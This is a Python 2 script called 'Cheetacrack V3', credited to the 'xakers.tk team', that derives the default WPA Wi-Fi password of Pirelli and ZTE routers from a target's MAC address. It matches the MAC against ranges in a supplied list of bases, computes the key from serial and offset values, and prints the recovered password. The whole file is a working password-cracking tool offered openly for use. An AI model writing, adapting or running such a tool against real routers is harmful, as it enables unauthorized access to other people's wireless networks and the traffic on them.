#   This program is free software; you can redistribute it and/or modify  
#   it under the terms of the GNU General Public License as published by  
#   the Free Software Foundation; either version 2 of the License, or     
#   (at your option) any later version.                                   
                                                                         
#   This program is distributed in the hope that it will be useful,       
#   but WITHOUT ANY WARRANTY; without even the implied warranty of        
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         
#   GNU General Public License for more details.    

import sys
import fileinput



def help():
   print ""
   print ""
   print ""
   print "          *************************************************"
   print "          *                                               *"
   print "          *     Cheetacrack python script V3              *"
   print "          *     for Pirelli and ZTE routers               *"
   print "          *     by xakers.tk team                         *"
   print "          *                                               *"
   print "          *************************************************"
   print ""
   print ""
   print ""
   print ""
   print "usage: python cheetacrackV3.py <mac_addres> <file_input> "
   print ""
   print "Example: python cheetacrackV3.py 38:22:9D:A3:00:00 bases.lst"
   print ""
   print ""
   print ""
   print ""

if(len(sys.argv)>2):
   mac_addr=sys.argv[1]    
   fin=sys.argv[2]      
   inputmacf6=mac_addr[0:8] 
   inputmacl6=mac_addr[9:17] 
   try:
      for line in fileinput.input(fin):
         filemacf6=line[0:8]         
         filemacfl6=line[9:17]
         filemacll6=line[18:26]
         sn1=line[27:37]
         base=line[38:44]
         inc=line[45]
         testimacl6=mac_addr[9:17]
         jojogps=bool(0)
         if(filemacf6==inputmacf6 and filemacfl6<=inputmacl6<=filemacll6):
            jojogps=bool(1)
            testimacl6=testimacl6.replace(':','')
            sn1=sn1.replace(' ','')  
            testimacl6=int(testimacl6,16)
            base=int(base,16)
            inc=int(inc)
            ris=testimacl6-base
            ris=ris/inc
            ris=str(ris)
            cc=len(ris)
            zeros=(7-cc)
            i=0
            while(i<zeros):   
               ris="0"+ris
               i=i+1
            print ""
            print ""
            print ""
            print "      checking if script works...",jojogps
            print "##########################################"
            print "##########################################"
            print "##   Key found!!!                       ##"
            print "##   working MAC =",mac_addr,"   ##"
            print "##   WPA wifi password =",sn1+""+ris," ##"
            print "##########################################"
            print "############################### jojoGPS ##"
            print ""
            print ""
            print ""
            sys.exit()
   except IOError:
      print "No such file"
      sys.exit()   
   if(not(jojogps)):
      print ""
      print ""
      print ""
      print ""
      print ""
      print "Finally Result:",jojogps
      print "ERROR while working for this MAC: ",mac_addr
      print "Problem in file bases.lst Mac is not on the list!!!!!!!"
      print ""
      print " ###################################"
      print " #  THIS MAC IS NOT IN THE LIST!!  #"
      print " ###################################"
      print ""
      print "help us find this MAC at www.xakers.tk team"
      print ""
      print ""
      sys.exit()

else:
   help()
